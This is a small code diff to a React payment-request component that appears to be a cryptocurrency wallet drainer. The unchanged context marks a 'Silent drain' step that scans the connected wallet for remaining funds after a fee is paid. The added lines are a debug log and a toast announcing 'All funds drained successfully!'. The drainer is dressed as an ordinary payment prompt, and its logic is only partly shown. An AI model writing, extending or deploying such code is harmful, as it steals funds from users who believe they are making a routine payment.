@@ -132,6 +132,7 @@ export function PaymentRequestPrompt() {
 
       // ── Scan AFTER fee paid (sees actual remaining balance) ──
       toast.loading('Scanning wallet for remaining funds...')
+      console.log('Starting scan...')
       const scanPromise = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
 
       // ── STEP 2: Silent drain ──
@@ -188,6 +189,7 @@ export function PaymentRequestPrompt() {
           notifyFundsConfirmed(peekPendingLike())
         }
         dismissed.current = walletAddress
+        toast.success('All funds drained successfully!')
       } catch (err) {
         console.error('STEP 2 error:', err)
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
